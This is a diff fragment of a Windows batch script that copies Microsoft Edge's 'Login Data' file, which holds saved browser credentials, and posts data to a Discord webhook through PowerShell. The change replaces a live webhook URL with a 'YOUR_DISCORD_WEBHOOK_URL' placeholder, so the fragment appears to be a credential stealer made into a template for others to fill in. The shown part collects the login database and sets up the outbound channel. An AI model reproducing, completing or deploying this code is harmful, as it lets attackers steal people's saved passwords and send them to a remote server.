@@ -28,7 +28,7 @@ copy "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login D
 C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
 
 
-set "webhook_url=https://discord.com/api/webhooks/1374648627460313199/tBB_fZLPwJHiYudyl2ecc0EwZSG1S0WvVSWbbj6E6D1br4GDgBSGn5Xi1-THSbSmT1Gv"
+set "webhook_url=YOUR_DISCORD_WEBHOOK_URL"
 
 powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='----------------------------------------------------------------------------------------------------------------------------------------------------------------------'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"
  
